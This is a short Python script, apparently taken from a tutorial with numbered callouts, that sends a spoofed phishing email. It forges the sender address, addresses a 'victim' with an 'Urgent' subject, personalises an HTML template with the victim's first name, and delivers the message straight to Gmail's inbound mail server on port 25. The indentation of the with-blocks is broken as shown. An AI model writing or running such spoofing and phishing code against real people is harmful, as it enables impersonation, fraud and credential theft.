from smtplib import SMTP
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
receiver = 'victimEmail'
receiver_name = 'Victim Name'
fromaddr = 'Name <spoofed@domain.com>'
smtp_server = "gmail-smtp-in.l.google.com"
msg = MIMEMultipart()
msg['Subject'] = "Urgent"
msg['From'] = fromaddr
with open('template.html', 'r') as file: (1)
message = file.read().replace('\n', '')
message = message.replace("{{FirstName}}", receiver_name)
msg.attach(MIMEText(message, "html"))
with SMTP(smtp_server, 25) as smtp:
 smtp.starttls() (2)
smtp.sendmail(fromaddr, receiver, msg.as_string())
